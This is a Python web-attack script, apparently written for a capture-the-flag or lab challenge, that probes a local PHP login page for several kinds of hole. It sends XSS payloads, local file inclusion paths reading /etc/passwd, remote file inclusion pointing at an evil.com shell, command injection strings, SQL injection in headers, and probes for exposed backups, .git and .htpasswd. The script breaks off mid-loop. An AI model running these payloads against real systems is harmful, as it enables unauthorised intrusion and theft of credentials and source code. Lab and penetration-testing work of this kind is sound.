import requests
import re

# Target configuration
base_url = "http://127.0.0.1:32989"
target_url = f"{base_url}/index.php"

print("COMPREHENSIVE FINAL VULNERABILITY TEST")
print("=" * 80)

# 1. XSS Testing
print("\n[1] CROSS-SITE SCRIPTING (XSS) TESTS")
print("-" * 60)

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

for payload in xss_payloads:
    r = requests.post(target_url, data={"username": payload, "password": "x"}, timeout=10)
    if payload in r.text:
        print(f"  [!] POTENTIAL XSS: {payload[:30]}... reflected")
    else:
        print(f"  [ ] Safe: {payload[:30]}...")

# 2. Local File Inclusion (LFI) - via page parameter
print("\n\n[2] LOCAL FILE INCLUSION (LFI) TESTS")
print("-" * 60)

lfi_tests = [
    f"{target_url}?page=../../../etc/passwd",
    f"{target_url}?page=../../index.php",
    f"{target_url}?page=php://filter/read=convert.base64-encode/resource=index.php",
    f"{target_url}?file=../../../etc/passwd",
    f"{target_url}?include=index.php",
]

for url in lfi_tests:
    try:
        r = requests.get(url, timeout=10)
        if 'root:' in r.text or '<?php' in r.text or len(r.text) > 5000:
            print(f"  [!] LFI POTENTIAL: {url[-40:]}")
            print(f"      Response length: {len(r.text)}")
        else:
            print(f"  [ ] No LFI: {url[-40:]}")
    except Exception as e:
        print(f"  [ ] Error: {url[-40:]} - {str(e)[:20]}")

# 3. Remote File Inclusion (RFI)
print("\n\n[3] REMOTE FILE INCLUSION (RFI) TESTS")
print("-" * 60)

rfi_tests = [
    f"{target_url}?page=http://evil.com/shell.txt",
    f"{target_url}?include=http://evil.com/shell.txt",
]

for url in rfi_tests:
    try:
        r = requests.get(url, timeout=10)
        print(f"  [ ] RFI test: {url[-40:]} - Status {r.status_code}")
    except Exception as e:
        print(f"  [ ] RFI error: {str(e)[:30]}")

# 4. Command Injection
print("\n\n[4] COMMAND INJECTION TESTS")
print("-" * 60)

cmd_payloads = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "; ls -la",
    "| id",
]

for payload in cmd_payloads:
    r = requests.post(target_url, data={"username": payload, "password": "x"}, timeout=10)
    if 'root:' in r.text or 'uid=' in r.text or 'bin/' in r.text:
        print(f"  [!] CMD INJ: {payload[:25]} - Response contains command output!")
    else:
        print(f"  [ ] Safe: {payload[:25]}")

# 5. Check static files for source code leaks
print("\n\n[5] SOURCE CODE / CONFIGURATION LEAKS")
print("-" * 60)

file_checks = [
    "/index.php~",
    "/index.php.bak",
    "/index.php.save",
    "/index.php.orig",
    "/index.php.swp",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.htaccess",
    "/.htpasswd",
    "/config.php",
    "/database.sql",
    "/backup.sql",
    "/dump.sql",
]

for filename in file_checks:
    try:
        r = requests.get(f"{base_url}{filename}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [!] FOUND: {filename} - Length {len(r.text)}")
            print(f"      First 200 chars: {r.text[:200]}")
        else:
            print(f"  [ ] Not found: {filename}")
    except Exception as e:
        print(f"  [ ] Error: {filename} - {str(e)[:20]}")

# 6. Check the background image for steganography hints
print("\n\n[6] STATIC FILES ANALYSIS")
print("-" * 60)

static_files = [
    "/static/springfield_background.jpg",
    "/static/",
    "/images/",
    "/css/",
    "/js/",
]

for path in static_files:
    try:
        r = requests.get(f"{base_url}{path}", timeout=10)
        print(f"  {path}: Status={r.status_code}, Length={len(r.content)}")
    except Exception as e:
        print(f"  {path}: Error - {str(e)[:20]}")

# 7. HTTP Method Testing
print("\n\n[7] HTTP METHOD TESTING")
print("-" * 60)

methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

for method in methods:
    try:
        r = requests.request(method, target_url, timeout=10)
        print(f"  {method:7}: Status={r.status_code}, Length={len(r.content)}")
    except Exception as e:
        print(f"  {method:7}: Error - {str(e)[:20]}")

# 8. Header-based injection
print("\n\n[8] HEADER-BASED INJECTION")
print("-" * 60)

# Try User-Agent injection
headers_tests = [
    {"User-Agent": "' OR '1'='1"},
    {"User-Agent": "admin'--"},
    {"X-Forwarded-For": "127.0.0.1' OR '1'='1"},
    {"Cookie": "session=test' OR '1'='1"},
]

for headers in headers_tests:
    try:
        r = requests.post(target_url, data={"username": "admin", "password": "admin"}, headers=headers, timeout=10)
        print(f"  Header injection: {list(headers.keys())[0]} - Length={len(r.text)}")
    except Exception as e:
        print(f"  Header injection error: {str(e)[:20]}")

# 9. Try to access the login with specific internal user agents
print("\n\n[9] INTERNAL EMPLOYEE BYPASS - USER AGENT")
print("-" * 60)

internal_uas = [
    "InternalEmployee/1.0",
    "EmployeeAgent",
    "SpringfieldInternal",
    "BurnsCorp/Employee",
    "SNPP-Employee",
]

for ua in internal_uas:
